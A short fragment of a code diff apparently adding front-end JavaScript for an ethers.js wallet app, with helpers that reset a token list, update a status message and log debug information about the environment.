+    if (scanAllBtn) scanAllBtn.classList.add("hidden");
+    if (tokensContainer) tokensContainer.classList.add("hidden");
+    
+    if (tokensEl) tokensEl.innerHTML = "";
+    if (tokenCount) tokenCount.textContent = "0 tokens";
+}
+
+function updateStatus(message) {
+    if (statusEl) {
+        statusEl.textContent = message;
+    }
+}
+
+// Debug info
+console.log("=== App Debug Info ===");
+console.log("Ethers version:", ethers.version);
+console.log("Window.ethereum:", typeof window.ethereum !== 'undefined');
+console.log("DOM Ready State:", document.readyState);
+console.log("======================");
